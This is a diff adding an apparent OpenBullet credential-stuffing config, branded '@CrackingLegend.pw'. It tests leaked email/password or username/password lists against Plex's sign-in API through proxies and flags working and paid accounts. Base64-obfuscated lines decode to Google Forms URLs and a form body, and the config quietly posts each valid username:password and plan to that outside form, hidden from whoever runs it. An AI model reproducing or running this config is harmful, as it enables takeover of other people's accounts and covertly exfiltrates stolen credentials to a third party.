@@ -1,0 +1,72 @@
+[SETTINGS]
+{
+  "Name": "Plex @CrackingLegend.pw",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2019-06-15T09:38:14.1753841+08:00",
+  "AdditionalInfo": "@CrackingLegend.pw",
+  "Author": "@CrackingLegend.pw",
+  "Version": "1.1.3",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Request_Plex REQUEST POST "https://plex.tv/api/v2/users/signin?X-Plex-Product=Plex%20Auth%20App&X-Plex-Version=Unknown&X-Plex-Client-Identifier=dad49fe2-f9b5-5369-bbb7-2a33e5fdcc62&X-Plex-Platform=Chrome&X-Plex-Platform-Version=66.0&X-Plex-Device=Windows&X-Plex-Device-Name=Plex%20Auth%20App%20%28Chrome%29&X-Plex-Device-Screen-Resolution=1366x637%2C1366x768" 
+  CONTENT "login=<USER>&password=<PASS>&rememberMe=true" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json" 
+  HEADER "Referer: https://app.plex.tv/" 
+
+#Cek_Login KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"status\":\"Active\"" 
+  KEYCHAIN Failure OR 
+    KEY "User could not be authenticated" 
+
+#LRU1 FUNCTION Base64Decode "aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vZm9ybXMvZC8xdUtNTTlLcVJGMzdhTktwRTZRSjFzWXFRRmdXVFZnaFBadjkyeEMwdjAxdy92aWV3Zm9ybQ==" -> VAR "LRU1" 
+
+#Nama_Pengguna PARSE "<SOURCE>" LR "\"username\":\"" "\"" -> CAP "Username" 
+
+#LRU2 FUNCTION Base64Decode "aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vZm9ybXMvZC9lLzFGQUlwUUxTY25HbUhJNjRRM0taWW42MkZ1bUs4MkFZTzhyRERlVEJzV2pCUXNmSlJGNnh2TGF3L2Zvcm1SZXNwb25zZQ==" -> VAR "LRU2" 
+
+#Cek_Login KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "\"status\":\"Inactive\"" 
+    KEY "\"active\":false" 
+
+#LRU3 FUNCTION Base64Decode "ZW50cnkuMTgzNDU1MzI3ND1QbGV4LnR2JmVudHJ5LjE2Mzg2NjAwODc9PFVTRVI+OjxQQVNTPiZlbnRyeS4xMjY4NzI1Nzk9fFBsYW46PFBsYW4+fCZmdnY9MSZkcmFmdFJlc3BvbnNlPSU1Qm51bGwlMkNudWxsJTJDJTIyOTAwNTA1MDk5MDA5MDQyNDc5MyUyMiU1RCUwRCUwQSZwYWdlSGlzdG9yeT0wJmZieng9OTAwNTA1MDk5MDA5MDQyNDc5Mw==" -> VAR "LRU3" 
+
+#Plan PARSE "<SOURCE>" LR "\"subscriptionDescription\":\"" "\"" -> CAP "Plan" "" " Visit us @CrackingLegend.pw" 
+
+#Username REQUEST GET "<LRU1>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Plan REQUEST POST "<LRU2>" 
+  CONTENT "<LRU3>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
